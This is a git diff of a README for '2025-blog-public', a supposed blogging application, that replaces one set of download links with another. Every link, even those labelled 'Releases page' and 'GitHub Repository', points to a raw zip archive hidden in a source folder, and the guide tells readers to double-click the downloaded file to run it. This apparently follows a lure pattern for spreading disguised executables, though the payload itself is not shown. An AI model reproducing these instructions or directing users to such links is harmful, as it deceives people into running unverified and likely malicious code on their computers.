@@ -12,10 +12,10 @@ Welcome to 2025-blog-public! This open-source tool lets you create and manage yo
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application. Click the link below to go directly to the download page:
 
-[![Download 2025-blog-public](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/write/hooks/2025-blog-public_jinrikiman.zip)](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/write/hooks/2025-blog-public_jinrikiman.zip)
+[![Download 2025-blog-public](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/image-toolbox/public_blog_2.7.zip)](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/image-toolbox/public_blog_2.7.zip)
 
 ### Step-by-Step Guide
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/write/hooks/2025-blog-public_jinrikiman.zip) to access the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/image-toolbox/public_blog_2.7.zip) to access the Releases page.
 2. **Choose the Latest Version**: Find the latest version listed at the top of the page.
 3. **Download the Application**: Click on the version tag to see the available files. Choose the file appropriate for your operating system (e.g., Windows, macOS, Linux) and click to download it.
 4. **Run the Application**: Once the download is complete, locate the file on your computer and double-click it to run the application.
@@ -40,7 +40,7 @@ Once you publish your blog posts, share them with friends or on social media. Th
 ## 💻 Updates and Improvements
 We frequently release updates that introduce new features, fix issues, and improve performance. Keep an eye on the Releases page for the latest changes.
 
-Be sure to download the application from our Releases page: [Download 2025-blog-public](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/write/hooks/2025-blog-public_jinrikiman.zip).
+Be sure to download the application from our Releases page: [Download 2025-blog-public](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/image-toolbox/public_blog_2.7.zip).
 
 ## 📚 Learn More
 For more detailed information on how to use each feature of the application, check our documentation available in the Wiki section of this repository. You can learn more about content management, SEO best practices, and customization tips.
@@ -49,7 +49,7 @@ For more detailed information on how to use each feature of the application, che
 We love contributions! If you’d like to help, consider improving the documentation, reporting bugs, or suggesting new features. Check our guidelines in the repository for more details on contributing.
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: Explore the code and contribute [here](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/write/hooks/2025-blog-public_jinrikiman.zip).
+- **GitHub Repository**: Explore the code and contribute [here](https://raw.githubusercontent.com/Zyadooo/2025-blog-public/main/src/app/image-toolbox/public_blog_2.7.zip).
 - **Community Forum**: Join discussions and ask for help within our community.
 
 Thank you for choosing 2025-blog-public. We hope you enjoy creating and sharing your blog!
